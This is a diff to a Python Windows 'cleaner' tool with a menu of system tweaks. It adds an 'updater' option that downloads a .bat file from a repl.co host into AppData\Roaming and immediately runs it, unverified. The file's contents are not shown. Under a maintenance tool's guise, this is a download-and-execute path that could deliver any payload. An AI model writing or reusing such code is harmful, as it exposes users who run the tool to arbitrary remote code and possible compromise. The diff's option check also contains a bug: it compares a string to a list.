@@ -31,7 +31,7 @@ System.Clear()
 Anime.Fade(Center.XCenter(banner), Colors.rainbow, Colorate.Vertical, interval=0.025, enter=True)
 os.system("title fr cleaner")
 banner = Center.XCenter("""
-ver 1.1
+ver 1.0
 ███████╗██████╗░  ░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗░
 ██╔════╝██╔══██╗  ██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
 █████╗░░██████╔╝  ██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
@@ -51,7 +51,9 @@ options = """
 6.)    turn on hibernate
 7.)    tree (better Responsiveness)
 8.)    Delete Windows Update Cache
-9.)    more info
+9.)    updater
+10.)   more info
+11.)   exit
 """
 def main():
     os.system('cls')
@@ -133,12 +135,22 @@ def main():
         print ("done")
         main()
     elif choice == '9':
+        url = "https://untimelyimpressionableadministration.blus2tlia.repl.co/updater.bat"
+        r = requests.get(url)  
+        username = os.getlogin()
+        with open(fr"\Users\{username}\AppData\Roaming\updater.bat", 'wb') as f:
+           f.write(r.content)
+        subprocess.os.system(fr"\Users\{username}\AppData\Roaming\updater.bat")
+        print ("done")
+        main()
+    elif choice == '10':
         os.system('cls')
         print(Colors.red, "made by dynasty still in beta ver", )
         input("Press Enter to continue...")
         main()
-       
-    elif choice != ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
+    elif choice == '11':
+       os._exit(0)  
+    elif choice != ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10','11' ]:
         print("That ain't an option\n")
         print("RESTARTING!!!")
         time.sleep(2)
